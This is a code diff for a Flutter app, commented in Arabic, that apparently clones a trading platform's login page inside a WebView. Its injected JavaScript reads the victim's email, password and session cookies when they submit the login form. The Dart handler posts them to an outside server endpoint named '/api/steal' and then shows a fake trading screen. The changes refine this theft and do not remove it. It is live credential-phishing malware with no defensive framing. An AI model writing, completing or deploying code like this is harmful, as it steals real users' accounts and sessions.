@@ -3,6 +3,7 @@ import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
+import 'dart:convert'; // عشان نقرأ الـ JSON
 
 void main() => runApp(const MyApp());
 
@@ -52,15 +53,30 @@ class _LoginScreenState extends State<LoginScreen> {
         onMessageReceived: (msg) async {
           print("JAVASCRIPT MESSAGE: ${msg.message}");
           
+          // 366. نفلتر الرسائل: نبعت للسيرفر بس اللي فيها إيميل وباسورد
           try {
-            await http.post(
-              Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-              headers: {"Content-Type": "application/json"},
-              body: msg.message,
-            );
-            print("SENT TO SERVER");
+            var data = jsonDecode(msg.message);
+            if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
+              await http.post(
+                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+                headers: {"Content-Type": "application/json"},
+                body: msg.message,
+              );
+              print("SENT CREDS TO SERVER: ${msg.message}");
+              
+              // نقل المستخدم للوحة التحكم
+              if (mounted) {
+                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+              }
+            } else if (data['type'] == 'cookies' && data['data'] != null) {
+                await http.post(
+                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+                headers: {"Content-Type": "application/json"},
+                body: msg.message,
+              );
+            }
           } catch (e) {
-            print("SERVER ERROR: $e");
+            print("Error parsing message: $e");
           }
         },
       )
@@ -68,15 +84,6 @@ class _LoginScreenState extends State<LoginScreen> {
         NavigationDelegate(
           onPageFinished: (url) {
             _injectOriginalScript();
-          },
-          onNavigationRequest: (request) {
-            // هون بنراقب إذا المستخدم دخل على صفحة التداول بعد تسجيل الدخول
-            if (request.url.contains('/trade') || request.url.contains('/demo-trade')) {
-              if (mounted) {
-                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
-              }
-            }
-            return NavigationDecision.navigate;
           },
         ),
       )
@@ -86,12 +93,6 @@ class _LoginScreenState extends State<LoginScreen> {
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
-        QTX_CREDS.postMessage(JSON.stringify({type: 'debug', message: 'script_executed'}));
-        
-        var savedEmail = "";
-        var savedPass = "";
-        var credsSent = false;
-
         function setNativeValue(el, value) {
           try {
             var proto = window.HTMLInputElement.prototype;
@@ -109,30 +110,21 @@ class _LoginScreenState extends State<LoginScreen> {
           return document.querySelector('input[name="password"], input[type="password"], #password');
         }
         
-        // دالة تراقب وتحدث المتغيرات المخفية
-        function updateSavedValues() {
-          var e = findEmail(), p = findPass();
-          if (e && e.value) savedEmail = e.value;
-          if (p && p.value) savedPass = p.value;
-        }
-
         function sendCreds() {
-          updateSavedValues();
-          if (!credsSent && savedEmail && savedPass) {
-            QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: savedEmail, password: savedPass}));
-            var cookie = document.cookie;
-            QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
-            credsSent = true; // عشان ما يبعتهم كذا مرة
-          }
+          try {
+            var e = findEmail(), p = findPass();
+            // 367. نتأكد إنه الحقول فيها قيم قبل ما نبعت
+            if (e && p && e.value && p.value) {
+              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
+              var cookie = document.cookie;
+              QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
+            }
+          } catch (err) {}
         }
         
         if (!window.__qtxHooksInstalled) {
           window.__qtxHooksInstalled = true;
-          
-          // بنحفظ البيانات أول ما يكتبها
-          document.addEventListener('input', updateSavedValues, true);
-          
-          // لما يدوس تسجيل دخول بنبعت
+          // لما يدوس على تسجيل الدخول بنبعت البيانات
           document.addEventListener('submit', sendCreds, true);
           document.addEventListener('click', function(ev) {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
